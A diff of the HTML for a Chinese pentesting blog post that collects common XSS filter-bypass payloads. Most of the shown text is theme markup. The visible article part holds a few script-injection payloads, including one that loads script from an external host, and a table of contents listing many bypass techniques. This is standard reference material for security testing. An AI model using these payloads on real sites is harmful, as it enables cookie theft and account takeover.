@@ -1,138 +1,197 @@
 <!DOCTYPE html>
 <html>
-  <!-- Html Head Tag-->
-  <head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="description" content="">
-  <meta name="author" content="Damit 5">
-  <!-- Open Graph Data -->
-  <meta property="og:title" content="XSS 绕过常用语句"/>
-  <meta property="og:description" content="纸上得来终觉浅，绝知此事要躬行。" />
-  <meta property="og:site_name" content="Damit5&#39;s Blog"/>
-  <meta property="og:type" content="article" />
-  <meta property="og:image" content="https://damit5.com"/>
+<head>
+  <meta charset="utf-8">
+  
+  <title>xss 绕过常用语句 | Damit5&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+    <meta name="keywords" content="damit5" />
+  
+  
+  
+  
+  <meta name="description" content="写在最前面:::下文中 alert 都可以由 prompt 代替">
+<meta name="keywords" content="渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS 绕过常用语句">
+<meta property="og:url" content="https://damit5.com/2017/10/15/XSS-绕过常用语句/index.html">
+<meta property="og:site_name" content="Damit5&#39;s Blog">
+<meta property="og:description" content="写在最前面:::下文中 alert 都可以由 prompt 代替">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2018-02-28T13:04:36.280Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS 绕过常用语句">
+<meta name="twitter:description" content="写在最前面:::下文中 alert 都可以由 prompt 代替">
   
     <link rel="alternate" href="/atom.xml" title="Damit5&#39;s Blog" type="application/atom+xml">
   
-  
-    <link rel="icon" href="/favicon.png">
+
   
 
-  <!-- Site Title -->
-  <title>Damit5's Blog</title>
-
-  <!-- Bootstrap CSS -->
-  <link rel="stylesheet" href="/css/bootstrap.min.css">
-  <!-- Custom CSS -->
+  <link rel="icon" href="/css/images/favicon.png">
+  <link rel="apple-touch-icon" href="/css/images/favicon.png">
   
-  <link rel="stylesheet" href="/css/style.dark.css">
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+  <link rel="stylesheet" href="/css/style.css">
 
-  <!-- Google Analytics -->
+  <script src="/js/jquery-3.1.1.min.js"></script>
+  <script src="/js/bootstrap.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    <link rel="stylesheet" href="/css/dialog.css">
+  
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+  
   
 
 </head>
 
-  <body>
-    <!-- Page Header -->
 
 
-<header class="site-header header-background" style="background-image: url(/img/background.jpg)">
-  <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        <div class="page-title with-background-image">
-          <p class="title">XSS 绕过常用语句</p>
-          <p class="subtitle"></p>
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="124px" height="124px" alt="Hike News" src="/css/images/favicon.png">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">Home</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/AboutMe">About</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/Link">link</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
-        <div class="site-menu with-background-image">
-          <ul>
-            
-              <li>
-                <a href="/">
-                  
-                  Home
-                  
-                </a>
-              </li>
-            
-              <li>
-                <a href="/archives">
-                  
-                  Archives
-                  
-                </a>
-              </li>
-            
-              <li>
-                <a href="https://github.com/damit5/">
-                  
-                  Github
-                  
-                </a>
-              </li>
-            
-              <li>
-                <a href="mailto:damit5@protonmail.com">
-                  
-                  Email
-                  
-                </a>
-              </li>
-            
-              <li>
-                <a href="https://damit5.github.io/AboutMe">
-                  
-                  AboutMe
-                  
-                </a>
-              </li>
-            
-              <li>
-                <a href="https://damit5.github.io/Link">
-                  
-                  Friend Link
-                  
-                </a>
-              </li>
-            
-          </ul>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
         </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div></li>
+            </div>
+          </div>
+                
       </div>
     </div>
-  </div>
+
 </header>
 
-<article>
-  <div class="container typo">
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        <div class="post-info text-muted">
-          
-            <!-- Author -->
-            <span class="author info">By Damit 5</span>
-          
-          <!-- Date -->
-          <span class="date-time info">On
-            <span class="date">2017-10-15</span>
-            <span class="time">17:32:32</span>
-          </span>
-          
-        </div>
-        <!-- Tags -->
+
+
+      
+            
+      <div id="content" class="outer">
         
-          <div class="post-tags text-muted">
-            Tags: 
-
-<a class="tag" href="/tags/渗透测试/">#渗透测试</a>
-
-
-          </div>
+          <section id="main" style="float:none;"><article id="post-XSS-绕过常用语句" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
         
-        <!-- Post Main Content -->
-        <div class="post-content">
-          <script src="/assets/js/APlayer.min.js"> </script><h4 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面:::"></a>写在最前面:::</h4><p>下文中 <code>alert</code> 都可以由 <code>prompt</code> 代替</p>
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      XSS 绕过常用语句
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2017/10/15/XSS-绕过常用语句/" class="article-date">
+	  <time datetime="2017-10-15T06:29:27.000Z" itemprop="datePublished">2017-10-15</time>
+	</a>
+
+      
+      
+	<a class="article-views">
+	<span id="busuanzi_container_page_pv">
+		PV:<span id="busuanzi_value_page_pv"></span>
+	</span>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <script src="/assets/js/APlayer.min.js"> </script><h4 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面:::"></a>写在最前面:::</h4><p>下文中 <code>alert</code> 都可以由 <code>prompt</code> 代替</p>
 <a id="more"></a>
 <h2 id="最常用的-XSS-漏洞测试代码："><a href="#最常用的-XSS-漏洞测试代码：" class="headerlink" title="最常用的 XSS 漏洞测试代码："></a>最常用的 XSS 漏洞测试代码：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;prompt(&quot;XSS&quot;)&lt;/script&gt;</div><div class="line"></div><div class="line"></div><div class="line">&lt;SCRIPT SRC=http://damit5.ml/xss.js&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
 <h2 id="在输入-Input-标签里"><a href="#在输入-Input-标签里" class="headerlink" title="在输入(Input)标签里"></a>在输入(Input)标签里</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;INPUT type=&quot;text&quot; value=&apos;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;&gt;</div></pre></td></tr></table></figure>
@@ -336,42 +395,258 @@
 			});
 		</script>
 
-        </div>
-      </div>
+      
     </div>
+    <footer class="article-footer">
+      
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
+
+    </footer>
   </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/11/22/Microsoft-Office内存损坏漏洞（CVE–2017–11882-复现/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Microsoft Office内存损坏漏洞（CVE–2017–11882) 复现
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/09/30/Windows-MySQL-的安装/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Windows MySQL 的安装</div>
+    </a>
+  
+</nav>
+
+  
 </article>
 
+<!-- Table of Contents -->
 
-
-    <!-- Footer -->
-<footer>
-  <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        <p class="copyright text-muted">
-          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
-          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
-        <p class="copyright text-muted">
-          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
-        </p>
-      </div>
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#写在最前面"><span class="nav-number">1.</span> <span class="nav-text">写在最前面:::</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#最常用的-XSS-漏洞测试代码："><span class="nav-number"></span> <span class="nav-text">最常用的 XSS 漏洞测试代码：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#在输入-Input-标签里"><span class="nav-number"></span> <span class="nav-text">在输入(Input)标签里</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#闭合-lt-input-gt"><span class="nav-number">1.</span> <span class="nav-text">闭合<input></span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过单引号过滤"><span class="nav-number"></span> <span class="nav-text">绕过单引号过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#例子"><span class="nav-number">1.</span> <span class="nav-text">例子:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#例子-1"><span class="nav-number">2.</span> <span class="nav-text">例子</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过-lt-SCRIPT-gt-过滤"><span class="nav-number"></span> <span class="nav-text">绕过 <SCRIPT>过滤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用-IMG-源"><span class="nav-number"></span> <span class="nav-text">使用 IMG 源</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#例子："><span class="nav-number">1.</span> <span class="nav-text">例子：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#标准的样子："><span class="nav-number">1.0.1.</span> <span class="nav-text">标准的样子：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#没有双引号和分号"><span class="nav-number">1.0.2.</span> <span class="nav-text">没有双引号和分号:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#不区分大小写的xss攻击向量"><span class="nav-number">1.0.3.</span> <span class="nav-text">不区分大小写的xss攻击向量</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#过滤了双引号和-lt-script-gt"><span class="nav-number">1.0.4.</span> <span class="nav-text">过滤了双引号和 <script>:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#使用-CharCode-绕过过滤"><span class="nav-number">1.0.5.</span> <span class="nav-text">使用 CharCode 绕过过滤:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#有经验的攻击者也可以把上面的全部转换成相等的-Ascii-码"><span class="nav-number">1.0.6.</span> <span class="nav-text">有经验的攻击者也可以把上面的全部转换成相等的 Ascii 码:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#使用-Ascii-表你可以自己试试。当然转换成-16-进制也是可以的。。"><span class="nav-number">1.0.7.</span> <span class="nav-text">使用 Ascii 表你可以自己试试。当然转换成 16 进制也是可以的。。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#默认SRC属性去绕过SRC域名检测过滤器"><span class="nav-number">1.0.8.</span> <span class="nav-text">默认SRC属性去绕过SRC域名检测过滤器</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#默认SRC属性通过省略它的值"><span class="nav-number">1.0.9.</span> <span class="nav-text">默认SRC属性通过省略它的值</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#默认SRC属性通过完全不设置它"><span class="nav-number">1.0.10.</span> <span class="nav-text">默认SRC属性通过完全不设置它</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#结尾没有分号的十六进制html编码引用"><span class="nav-number">1.0.11.</span> <span class="nav-text">结尾没有分号的十六进制html编码引用</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用制表符-换行符和回车符"><span class="nav-number"></span> <span class="nav-text">使用制表符, 换行符和回车符</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#使用了最小的十六进制的制表符来欺骗过滤器"><span class="nav-number">0.0.1.</span> <span class="nav-text">使用了最小的十六进制的制表符来欺骗过滤器</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用空字符"><span class="nav-number"></span> <span class="nav-text">使用空字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#双引号配对的bug"><span class="nav-number"></span> <span class="nav-text">双引号配对的bug</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#例子-2"><span class="nav-number">1.</span> <span class="nav-text">例子</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#不全面的过滤器"><span class="nav-number"></span> <span class="nav-text">不全面的过滤器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#畸形的A标签"><span class="nav-number"></span> <span class="nav-text">畸形的A标签</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用双引号"><span class="nav-number"></span> <span class="nav-text">使用双引号</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#如果你需要使用双引号和单引号。使用一些诡异的用法吧-重音符混淆-。"><span class="nav-number">0.0.1.</span> <span class="nav-text">如果你需要使用双引号和单引号。使用一些诡异的用法吧 (重音符混淆)。</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#转义字符"><span class="nav-number"></span> <span class="nav-text">转义字符</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#转义字符有时候很有用，可以对付一些简单的过滤器"><span class="nav-number">0.0.1.</span> <span class="nav-text">转义字符有时候很有用，可以对付一些简单的过滤器</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#编码"><span class="nav-number"></span> <span class="nav-text">编码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#使用-utf-7-编码可以绕过"><span class="nav-number">1.</span> <span class="nav-text">使用 utf-7 编码可以绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#例子-3"><span class="nav-number">2.</span> <span class="nav-text">例子</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#一个列表"><span class="nav-number">3.</span> <span class="nav-text">一个列表:</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#我也不知道咋分类了"><span class="nav-number"></span> <span class="nav-text">我也不知道咋分类了</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#内嵌TAB"><span class="nav-number">1.</span> <span class="nav-text">内嵌TAB</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#内嵌被编码的TAB"><span class="nav-number">2.</span> <span class="nav-text">内嵌被编码的TAB</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#内嵌换行符去分开xss代码"><span class="nav-number">3.</span> <span class="nav-text">内嵌换行符去分开xss代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#编码回车符去分开xss代码"><span class="nav-number">4.</span> <span class="nav-text">编码回车符去分开xss代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#没有分割的javascript指令"><span class="nav-number">5.</span> <span class="nav-text">没有分割的javascript指令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#图片元素中javascript之前的空格和元字符为xss"><span class="nav-number">6.</span> <span class="nav-text">图片元素中javascript之前的空格和元字符为xss</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#非字母数字字符xss"><span class="nav-number">7.</span> <span class="nav-text">非字母数字字符xss</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#例如"><span class="nav-number">7.1.</span> <span class="nav-text">例如</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#附加的开括号"><span class="nav-number">8.</span> <span class="nav-text">附加的开括号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#没关闭的script标签"><span class="nav-number">9.</span> <span class="nav-text">没关闭的script标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#script标签中的协议解析"><span class="nav-number">10.</span> <span class="nav-text">script标签中的协议解析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#半开的HTML-JavaScript-xss向量"><span class="nav-number">11.</span> <span class="nav-text">半开的HTML/JavaScript xss向量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#双开尖括号"><span class="nav-number">12.</span> <span class="nav-text">双开尖括号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#转义javascript中的转义"><span class="nav-number">13.</span> <span class="nav-text">转义javascript中的转义</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#闭合title标签"><span class="nav-number">14.</span> <span class="nav-text">闭合title标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#INPUT-image"><span class="nav-number">15.</span> <span class="nav-text">INPUT image</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BODY-image"><span class="nav-number">16.</span> <span class="nav-text">BODY image</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IMG-DYNSRC-视频剪辑"><span class="nav-number">17.</span> <span class="nav-text">IMG DYNSRC(视频剪辑)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IMG-lowsrc（低分辨率图片）"><span class="nav-number">18.</span> <span class="nav-text">IMG lowsrc（低分辨率图片）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#List-style-image"><span class="nav-number">19.</span> <span class="nav-text">List-style-image</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#List-style-image-1"><span class="nav-number">20.</span> <span class="nav-text">List-style-image</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#VBscript-in-an-image"><span class="nav-number">21.</span> <span class="nav-text">VBscript in an image</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Livescript-仅适用于老版本的Netscape"><span class="nav-number">22.</span> <span class="nav-text">Livescript (仅适用于老版本的Netscape)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BGSOUND-背景音乐"><span class="nav-number">23.</span> <span class="nav-text">BGSOUND(背景音乐)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#amp-JavaScript-包含"><span class="nav-number">24.</span> <span class="nav-text">& JavaScript 包含</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#样式表"><span class="nav-number">25.</span> <span class="nav-text">样式表</span></a></li></ol>
+    
     </div>
+  </aside>
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2017 - 2018 Damit5&#39;s Blog All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				UV : <span id="busuanzi_value_site_uv"></span> |  
+				PV : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
   </div>
 </footer>
 
 
-    <!-- After Footer Scripts -->
-<script src="/js/highlight.pack.js"></script>
+<!-- min height -->
+
 <script>
-  document.addEventListener("DOMContentLoaded", function(event) {
-    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
-    codeBlocks.forEach(function(block, index) {
-      hljs.highlightBlock(block);
-    });
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/AboutMe" class="mobile-nav-link">About</a>
+  
+    <a href="/Link" class="mobile-nav-link">Link</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
   });
 </script>
 
-  </body>
-</html>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
 
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/scripts.js"></script>
+
+
+
+
+  <script src="/js/dialog.js"></script>
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            Damit5&#39;s Blog
+          </div>
+          <div class="panel-body">
+            Copyright © 2018 Damit 5 All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+</body>
+</html>
